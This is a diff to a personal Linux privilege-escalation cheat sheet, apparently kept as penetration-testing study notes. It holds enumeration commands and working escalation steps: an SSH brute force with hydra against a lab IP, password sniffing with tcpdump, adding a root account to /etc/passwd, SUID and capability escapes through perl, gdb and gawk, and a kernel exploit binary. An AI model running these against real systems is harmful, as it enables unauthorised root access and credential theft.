@@ -9,7 +9,7 @@
 
 ## Linux Permisisons
 
-* s    = suid, guid bit runs with the permission of the file owner
+* -rws  = suid, guid bit runs with the permission of the file owner
 * dr-- = list directory
 * drw- = create and write files
 * drwx = crossing through directory to access content e.g. cd /var
@@ -27,7 +27,8 @@
 * list firewall config and rules `cat /etc/iptables`
 * list scheduled task `ls -lah /etc/cron*`
 * list installed packages and apps `dpkg -l`
-* list writeable directory and files `find / -perm -u=s type -f, find / -writeable -type d`
+* list suid binaries `find / -perm -u=s type -f`
+* list writeable directories and files by the user `find / -writeable -type d`
 * list mounted filesystem, fstab at boot time `mount`
 * list available disks `lsblk`
 * list drivers and kernel module `lsmod, /sbin/modinfo`
@@ -77,23 +78,25 @@ ls -lah /etc/cron*
 # list installed packages and applications
 dpkg -l
 apt list --installed | grep sudo
+rpm -qa
 
-
-# list writeable directory and files
+# list suid binaries
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
+
+# list writeable directories and files by the user
 find / -type d -writable 2>/dev/null
 find ~ -type f -writable 2>/dev/null
 
 # list mounted filesystem, fstab at boot time
-df -h
-cat /etc/fstab
 mount
-
   /dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+
+cat /etc/fstab
 
 # list avaiable disks
 lsblk
+df -h
 
 # list drivers and kernel modules including file name and version
 lsmod
@@ -116,6 +119,7 @@ find / -name ftp
 ```bash
 # perform standard privilege checks
 cp /usr/bin/unix-privesc-check .
+chmod +x ./unix-privesc-check
 ./unix-privesc-check standard > output.txt
 
 # find keyword in files, report to /tmp
@@ -146,6 +150,7 @@ watch -n 1 "ps -aux | grep pass"
 sudo tcpdump -i lo -A | grep "pass"
 
 # create word list and run hydra to crack it using ssh
+# crunch - t <pattern>
 crunch 6 6 -t lab%%% > wordlist
 hydra -l user -P wordlist  192.168.50.214 -t 4 ssh -V
 
@@ -194,7 +199,8 @@ echo "[+] Add admin:s3cret to /etc/passwd"; cat /etc/passwd; grep "root" /etc/pa
 * Requires a process with suid (s) being executed
 * Get process id `ps aux -C passwd`
 * Grep real, effective, saved set and filesystem UIs
-* e.g. `grep Uid /proc/1932/status`
+  * e.g. `grep Uid /proc/1932/status`
+  * Uid: 1000   0   0   0  
 * find suid bit `find / -perm -u=s`
 * find suid cap `/usr/sbin/getcap -r / 2>/dev/null`
 
@@ -215,8 +221,10 @@ find /home/bob/ -exec "/usr/bin/bash" -p \;
 whoami
  root
 
-# exploit perl cap_suid+ep (gtfobins.github.com)
+# find suid cap
 /usr/sbin/getcap -r / 2>/dev/null
+
+# exploit perl cap_suid+ep (gtfobins.github.com)
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'
 
 # exploit gdb cap_suid+ep (gtfobins.github.com)
@@ -237,11 +245,11 @@ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 sudo -l
  (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
 
-# verify the AppAmor kernel module is not loaded for the binary
+# verify the AppAmor kernel module is not loaded for the abusable binary 
 aa-status
 
 # abuse bash
-sduo bash -i
+sudo bash -i
 
 # abuse gawk
 gawk 'BEGIN {system("/bin/sh")}'
@@ -289,19 +297,11 @@ file cve-2017-16995
 ./cve-2017-16995
 ```
 
-
-
-
-
-
-
-
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/bash -i
-```
-
+```s
 
 ## Links
 
